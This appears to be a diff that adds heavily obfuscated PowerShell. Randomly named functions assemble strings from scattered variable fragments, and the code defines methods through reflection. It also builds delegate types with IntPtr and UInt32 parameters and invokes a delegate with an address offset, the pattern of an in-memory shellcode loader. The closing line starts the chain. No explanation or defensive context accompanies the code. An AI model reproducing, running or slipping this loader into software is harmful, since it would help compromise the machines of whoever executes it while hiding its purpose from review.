+$Nzjcf3=bqKPJqtm $mi5NUi $A2AfdB $X8ZfD2
+return $Nzjcf3
+}
+function VwNrJc
+{
+Param ($Zn9B)
+if($Zn9B -eq 'e')
+{
+'r'
+}
+else
+{
+if($Zn9B -lt 'e')
+{
+'f'
+}
+else
+{
+ArwVGcP $Zn9B
+}
+}
+}
+function ncDqf
+{
+$Rzk+$MystxY
+}
+function HcaGEBXKo
+{
+gJxOg($M6P9)
+}
+function uJxcMRL
+{
+$dYnv9+$WCTrjv
+}
+function yMblgwm
+{
+$Zbco1+$q18xr
+}
+function sJVZpkaV
+{
+Param ($wWwZ,$UYxg,$OomexR)
+$wWwZ.Invoke([IntPtr]::Zero,0,[Int64]$UYxg+$OomexR,[IntPtr]::Zero,0,[IntPtr]::Zero)
+}
+function xapMg
+{
+(lnZuzNee)+$Rf8zq+$kTR8v+$gMOia+$fzv+(lsbAVFiX)+$y1LDLf+$dMk
+}
+function djomokjenA
+{
+$RTgGhO+$RJV
+}
+function LPnQjBXi
+{
+(DEsIHNsi)+$xtMt+(acHEC)+$jziaG+(rMKjfouDxS)+$hels+(yXTWMbRqy)+(NqwdjoK)+$vPyH
+}
+function rNcSOe
+{
+$VGR+$J9XO
+}
+function kdotAub
+{
+$xjN+$HWGF
+}
+function GCopVu
+{
+RSoqFfL @([IntPtr],[UInt32],[UInt32],[UInt32])([IntPtr])
+}
+function OhsqrmCuZ
+{
+gJxOg($WJX4C4)
+}
+function RDtqNkXiPq
+{
+gJxOg($k1y+$dbWK)
+}
+function DQqxa
+{
+$iXGE+$ya9Ik
+}
+function RDYHQA
+{
+gJxOg($G3r5)
+}
+function DxlmoJ
+{
+$uON+$EgnpaA
+}
+function nsmhKPcRF
+{
+$h6Tr+$QULn
+}
+function WWWMRhVHJd
+{
+Param ($I9Mg)
+if($I9Mg -eq 'o')
+{
+'4'
+}
+else
+{
+'6'
+}
+}
+function wuMUtYiJ
+{
+$l8Nz+$X8p+$MbU
+}
+function QZidTinz
+{
+RSoqFfL @([IntPtr],[Int32])
+}
+function vwqJN
+{
+(FiJtf)+(wuMUtYiJ)+(tgCsN)+(KjsMOmLmLJ)+(DDBBNWnR)+$YD8+$Gfz
+}
+function adyQxeF
+{
+$c4LrP+$A4yHe
+}
+function RJpUbgz
+{
+$yVEUGH+$XnV
+}
+function DEsIHNsi
+{
+$pLka+$qRJfT+$T1K
+}
+function qjooiBqWb
+{
+$uoYs+$roJnr
+}
+function pSZZqSsSk
+{
+(fWoHjyMW)+(jwwSuLXqNO)+(qohZbz)+$x6rKD1+(aJptaxFCB)+(oSRCx)+$w4uvf1+$HSiikS+(uJxcMRL)
+}
+function yXTWMbRqy
+{
+$S8v+$knII
+}
+function pfKXTZ
+{
+gJxOg($eec)
+}
+function uIglEWr
+{
+$QxlmaO+$OQIS
+}
+function ZuyHbwjLJ
+{
+Param ($i0ny,$Mvo,$w5JQ)
+$i0ny.DefineMethod((HcaGEBXKo),(OOerRE),$Mvo,$w5JQ)
+}
+function NadHDpW
+{
+$ciDEww+$Wva+$C0wbC+$J4HmXS+$OtCh29+$UHUTn
+}
+function lOCuze
+{
+$oix+$CWVRA
+}
+function acHEC
+{
+$UedE+$v4M+$YrfEGf
+}
+function AHSdxlK
+{
+$KWxu+(LFgzS)+(mrJpJXELOl)+(qdukii)+$TlSC5L+(rNcSOe)+$WBZv+$ajC+$rBVoZ+$qQRnOY
+}
+function DcDfN
+{
+(CBFetet)+$XTYCRI+$f2Ot+(CWtbffCud)+(ncDqf)+(BbvUUfY)+$EBv+$sNb3g+$njzN
+}
+function VgReKFWkzg
+{
+Param ($qPjJcY)
+if($qPjJcY -eq 'o')
+{
+'d'
+}
+else
+{
+'7'
+}
+}
+function FgSPI
+{
+$JtBCX0+$sAmS
+}
+function lnZuzNee
+{
+$KhWaG1+$JjHKnY
+}
+MqWLcVBjYT
